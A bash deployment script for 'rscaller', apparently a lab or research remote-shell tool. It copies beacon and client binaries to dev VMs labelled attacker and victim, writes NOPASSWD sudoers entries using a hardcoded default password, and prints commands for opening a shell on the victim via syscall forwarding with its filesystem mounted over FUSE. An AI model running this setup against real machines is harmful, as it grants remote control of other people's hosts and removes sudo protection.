#!/usr/bin/env bash
# deploy-rsc.sh — Deploy rscaller Mode B (attacker → victim, no kmod)
#
# Usage: bash scripts/deploy-rsc.sh [ATTACKER_VM] [VICTIM_VM]
#
# Builds Docker image, extracts binaries, deploys to both VMs.

set -euo pipefail
ATTACKER="${1:-dev-vm-1}"
VICTIM="${2:-dev-vm-2}"
BECOME_PASS="${BECOME_PASS:-ubuntu}"
REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

step() {
	echo ""
	echo "==> $*"
}
ok() { echo "    [ok] $*"; }

BINARIES="rsc rscfuse rsclient rsbeacon"

step "Building Docker image rsc:latest"
cd "$REPO_ROOT"
docker build -t rsc:latest -f docker/rsc.Dockerfile . 2>&1 | tail -5
ok "image built"

step "Extracting binaries from container"
docker create --name rsc-extract rsc:latest
mkdir -p /tmp/rscaller-bins
for bin in $BINARIES; do
	docker cp rsc-extract:/usr/local/bin/$bin /tmp/rscaller-bins/$bin
done
docker rm rsc-extract
ok "extracted to /tmp/rscaller-bins"

step "Configuring NOPASSWD sudo on $ATTACKER"
ssh "$ATTACKER" "echo ${BECOME_PASS} | sudo -S bash -c \
  'echo ubuntu ALL=(ALL) NOPASSWD: ALL > /etc/sudoers.d/99-nopasswd && chmod 440 /etc/sudoers.d/99-nopasswd'" 2>/dev/null || true
ok "sudoers on $ATTACKER"

step "Configuring NOPASSWD sudo on $VICTIM"
ssh "$VICTIM" "echo ${BECOME_PASS} | sudo -S bash -c \
  'echo ubuntu ALL=(ALL) NOPASSWD: ALL > /etc/sudoers.d/99-nopasswd && chmod 440 /etc/sudoers.d/99-nopasswd'" 2>/dev/null || true
ok "sudoers on $VICTIM"

step "Copying binaries to $ATTACKER (attacker VM)"
scp /tmp/rscaller-bins/{rsc,rscfuse,rsclient,rsbeacon} "$ATTACKER:/tmp/"
ssh "$ATTACKER" "mkdir -p ~/bin && cp /tmp/{rsc,rscfuse,rsclient,rsbeacon} ~/bin/ && chmod +x ~/bin/{rsc,rscfuse,rsclient,rsbeacon}"
ok "binaries in ~/bin on $ATTACKER"

step "Copying binaries to $VICTIM (victim VM)"
scp /tmp/rscaller-bins/{rsbeacon,rsclient} "$VICTIM:/tmp/"
ssh "$VICTIM" "mkdir -p ~/bin && cp /tmp/{rsbeacon,rsclient} ~/bin/ && chmod +x ~/bin/{rsbeacon,rsclient}"
ok "binaries in ~/bin on $VICTIM"

VICTIM_IP=$(ssh "$VICTIM" "hostname -I | awk '{print \$1}'")

echo ""
echo "==> Deploy complete!"
echo ""
echo "On $VICTIM (victim), start beacon:"
echo "    ssh $VICTIM"
echo "    sudo ~/bin/rsbeacon --listen 0.0.0.0:9999"
echo ""
echo "On $ATTACKER (attacker), run shell:"
echo "    ssh $ATTACKER"
echo "    sudo ~/bin/rsc --beacon $VICTIM_IP:9999 --target victim --rscfuse ~/bin/rscfuse --rsclient ~/bin/rsclient -- /bin/bash"
echo ""
echo "What you'll see on attacker:"
echo "    /rsc/victim/  — FUSE mount of victim's filesystem"
echo "    Shell commands execute on victim via syscall forwarding"
